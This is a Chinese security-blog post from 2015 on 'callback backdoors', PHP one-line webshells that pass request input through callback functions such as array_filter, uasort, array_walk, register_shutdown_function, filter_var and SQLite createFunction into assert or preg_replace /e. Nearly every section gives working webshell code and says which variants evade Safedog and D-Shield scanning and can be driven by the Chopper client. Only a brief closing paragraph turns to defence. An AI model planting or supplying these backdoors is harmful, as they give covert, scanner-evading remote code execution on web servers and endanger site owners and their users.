创造tips的秘籍——PHP回调后门
phith0n · 2015/07/20 10:58
0x00 前言

最近很多人分享一些过狗过盾的一句话，但无非是用各种方法去构造一些动态函数，比如'''$_GET['func']($_REQUEST['pass'])'''之类的方法。万变不离其宗，但这种方法，虽然狗盾可能看不出来，但人肉眼其实很容易发现这类后门的。

那么，我就分享一下，一些不需要动态函数、不用eval、不含敏感函数、免杀免拦截的一句话。

有很多朋友喜欢收藏一些tips，包括我也收藏了好多tips，有时候在渗透和漏洞挖掘过程中很有用处。

一句话的tips相信很多朋友也收集过好多，过狗一句话之类的。14年11月好像在微博上也火过一个一句话，当时也记印象笔记里了：


最近又看到有人在发这个：http://www.secoff.net/archives/436.html

有同学收集tips，就有同学创造tips。那么我们怎么来创造一些过狗、过D盾、无动态函数、无危险函数（无特征）的一句话（后门）？

根据上面这个pdo的一句话，我就可以得到一个很具有普适性的结论：php中包含回调函数参数的函数，具有做后门的潜质。

我就自己给这类webshell起了个名字：回调后门。

0x01 回调后门的老祖宗

php中call_user_func是执行回调函数的标准方法，这也是一个比较老的后门了：

    call_user_func('assert', $_REQUEST['pass']);

assert直接作为回调函数，然后$_REQUEST['pass']作为assert的参数调用。

这个后门，狗和盾都可以查到（但是狗不会拦截）：


可php的函数库是很丰富的，只要简单改下函数安全狗就不杀了：


    call_user_func_array('assert', array($_REQUEST['pass']));

'''call_user_func_array'''函数，和'''call_user_func'''类似，只是第二个参数可以传入参数列表组成的数组。如图：


可见，虽然狗不杀了，D盾还是聪明地识别了出来。

看来，这种传统的回调后门，已经被一些安全厂商盯上了，存在被查杀的风险。

0x02 数组操作造成的单参数回调后门

进一步思考，在平时的php开发中，遇到过的带有回调参数的函数绝不止上面说的两个。这些含有回调（callable类型）参数的函数，其实都有做“回调后门”的潜力。 我最早想到个最“简单好用的”：

    $e = $_REQUEST['e'];
    $arr = array($_POST['pass'],);
    array_filter($arr, base64_decode($e));

'''array_filter'''函数是将数组中所有元素遍历并用指定函数处理过滤用的，如此调用（此后的测试环境都是开着狗的，可见都可以执行）：


这个后门，狗查不出来，但D盾还是有感应，报了个等级3（显然比之前的等级4要低了）：


类似'''array_filter'''，'''array_map'''也有同样功效：

    $e = $_REQUEST['e'];
    $arr = array($_POST['pass'],);
    array_map(base64_decode($e), $arr);

依旧被D盾查杀。

果然，简单的数组回调后门，还是很容易被发现与查杀的。

0x03 php5.4.8+中的assert

php 5.4.8+后的版本，assert函数由一个参数，增加了一个可选参数descrition：


这就增加（改变）了一个很好的“执行代码”的方法assert，这个函数可以有一个参数，也可以有两个参数。那么以前回调后门中有两个参数的回调函数，现在就可以使用了。

比如如下回调后门：

    $e = $_REQUEST['e'];
    $arr = array('test', $_REQUEST['pass']);
    uasort($arr, base64_decode($e));

这个后门在php5.3时会报错，提示assert只能有一个参数：


php版本改作5.4后就可以执行了：


这个后门，狗和盾是都查不出来的：


同样的道理，这个也是功能类似：

    $e = $_REQUEST['e'];
    $arr = array('test' => 1, $_REQUEST['pass'] => 2);
    uksort($arr, $e);

再给出这两个函数，面向对象的方法：

// way 0

    $arr = new ArrayObject(array('test', $_REQUEST['pass']));
    $arr->uasort('assert');
 
// way 1

    $arr = new ArrayObject(array('test' => 1, $_REQUEST['pass'] => 2));
    $arr->uksort('assert');

再来两个类似的回调后门：

    $e = $_REQUEST['e'];
    $arr = array(1);
    $e = $_REQUEST['e'];
    
    $arr = array($_POST['pass']);
    $arr2 = array(1);
    array_udiff($arr, $arr2, $e);

以上几个都是可以直接菜刀连接的一句话，但目标PHP版本在5.4.8及以上才可用。

我把上面几个类型归为：二参数回调函数（也就是回调函数的格式是需要两个参数的）

0x04 三参数回调函数

有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数。比如'''array_walk'''。

'''array_walk'''的第二个参数是callable类型，正常情况下它是格式是两个参数的，但在0x03中说了，两个参数的回调后门需要使用php5.4.8后的assert，在5.3就不好用了。但这个回调其实也可以接受三个参数，那就好办了：


php中，可以执行代码的函数：

1.  一个参数：'''assert'''
2.  两个参数：'''assert （php5.4.8+'''）
3.  三个参数：'''preg_replace /e模式'''
三个参数可以用'''preg_replace'''。所以我这里构造了一个'''array_walk'''+ '''preg_replace'''的回调后门：

    $e = $_REQUEST['e'];
    $arr = array($_POST['pass'] => '|.*|e',);
    array_walk($arr, $e, '');

如图，这个后门可以在5.3下使用：


但强大的D盾还是有警觉（虽然只是等级2）：

不过呵呵，PHP拥有那么多灵活的函数，稍微改个函数（'''array_walk_recursive'''）D盾就查不出来了：

    $e = $_REQUEST['e'];
    $arr = array($_POST['pass'] => '|.*|e',);
    array_walk_recursive($arr, $e, '');

不截图了。

看了以上几个回调后门，发现preg_replace确实好用。但显然很多WAF和顿顿狗狗的早就盯上这个函数了。其实php里不止这个函数可以执行eval的功能，还有几个类似的：

    mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');

另一个：

    echo preg_filter('|.*|e', $_REQUEST['pass'], '');

这两个一句话都是不杀的：

好用的一句话，且用且珍惜呀。

0x05 无回显回调后门

回调后门里，有个特殊的例子：ob_start。

ob_start可以传入一个参数，也就是当缓冲流输出时调用的函数。但由于某些特殊原因（可能与输出流有关），即使有执行结果也不在流里，最后也输出不了，所以这样的一句话没法用菜刀连接：

    ob_start('assert');
    echo $_REQUEST['pass'];
    ob_end_flush();

但如果执行一个url请求，用神器cloudeye还是能够观测到结果的：


即使没输出，实际代码是执行了的。也算作回调后门的一种。

0x06 单参数后门终极奥义

'''preg_replace'''、三参数后门虽然好用，但/e模式php5.5以后就废弃了，不知道哪天就会给删了。所以我觉得还是单参数后门，在各个版本都比较好驾驭。 这里给出几个好用不杀的回调后门

    $e = $_REQUEST['e'];
    register_shutdown_function($e, $_REQUEST['pass']);

这个是php全版本支持的，且不报不杀稳定执行：


再来一个：

    $e = $_REQUEST['e'];
    declare(ticks=1);
    register_tick_function ($e, $_REQUEST['pass']);

再来两个：

    filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));

这两个是filter_var的利用，php里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且option为assert即可。

这几个单参数回调后门非常隐蔽，基本没特征，用起来很6.

0x07 数据库操作与第三方库中的回调后门

回到最早微博上发出来的那个sqlite回调后门，其实sqlite可以构造的回调后门不止上述一个。

我们可以注册一个sqlite函数，使之与assert功能相同。当执行这个sql语句的时候，就等于执行了assert。所以这个后门我这样构造：

    $e = $_REQUEST['e'];
    $db = new PDO('sqlite:sqlite.db3');
    $db->sqliteCreateFunction('myfunc', $e, 1);
    $sth = $db->prepare("SELECT myfunc(:exec)");
    $sth->execute(array(':exec' => $_REQUEST['pass']));

执行之：

上面的sqlite方法是依靠PDO执行的，我们也可以直接调用sqlite3的方法构造回调后门：


    $e = $_REQUEST['e'];
    $db = new SQLite3('sqlite.db3');
    $db->createFunction('myfunc', $e);
    $stmt = $db->prepare("SELECT myfunc(?)");
    $stmt->bindValue(1, $_REQUEST['pass'], SQLITE3_TEXT);
    $stmt->execute();

前提是php5.3以上。如果是php5.3以下的，使用sqlite_*函数，自己研究我不列出了。

这两个回调后门，都是依靠php扩展库（pdo和sqlite3）来实现的。其实如果目标环境中有特定扩展库的情况下，也可以来构造回调后门。 比如php_yaml：


    $str = urlencode($_REQUEST['pass']);
    $yaml = <<<EOD
    greeting: !{$str} "|.+|e"
    EOD;
    $parsed = yaml_parse($yaml, 0, $cnt, array("!{$_REQUEST['pass']}" => 'preg_replace'));

还有php_memcached：

    $mem = new Memcache();
    $re = $mem->addServer('localhost', 11211, TRUE, 100, 0, -1, TRUE, create_function('$a,$b,$c,$d,$e', 'return assert($a);'));
    $mem->connect($_REQUEST['pass'], 11211, 0);

自行研究吧。

0x08 其他参数型回调后门

上面说了，回调函数格式为1、2、3参数的时候，可以利用assert、assert、preg_replace来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？

举个例子，php5.5以后建议用'''preg_replace_callback'''代替'''preg_replace'''的/e模式来处理正则执行替换，那么其实'''preg_replace_callback'''也是可以构造回调后门的。

'''preg_replace_callback'''的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为assert，就会执行不了，因为assert接受的参数是字符串。

所以我们需要去“构造”一个满足条件的回调函数。

怎么构造？使用create_function：

    preg_replace_callback('/.+/i', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);

“创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。

这也是一个不杀不报稳定执行的回调后门，但因为有create_function这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。 类似的，这个也同样：


    mb_ereg_replace_callback('.+', create_function('$arr', 'return assert($arr[0]);'),$_REQUEST['pass']);

再来一个利用CallbackFilterIterator方法的回调后门：

    $iterator = new CallbackFilterIterator(new ArrayIterator(array($_REQUEST['pass'],)), create_function('$a', 'assert($a);'));
    foreach ($iterator as $item) {
    echo $item;}

这里也是借用了create_function来创建回调函数。但有些同学就问了，这里创建的回调函数只有一个参数呀？实际上这里如果传入assert，是会报错的，具体原因自己分析。

0x09 后记

这一篇文章，就像一枚核武器，爆出了太多无特征的一句话后门。我知道相关厂商在看了文章以后，会有一些小动作。不过我既然敢写出来，那么我就敢保证这些方法是多么难以防御。

实际上，回调后门是灵活且无穷无尽的后门，只要php还在发展，那么就有很多很多拥有回调函数的后门被创造。想要防御这样的后门，光光去指哪防哪肯定是不够的。

简单想一下，只有我们去控制住assert、preg_replace这类函数，才有可能防住这种漏洞。

[link-zh-cn](http://drops.wooyun.org/tips/7279)
[link-en](http://translate.wooyun.io/2015/07/28/The-Secrets-of-Creating-Tips-PHP-Reverse-Backdoors.html)
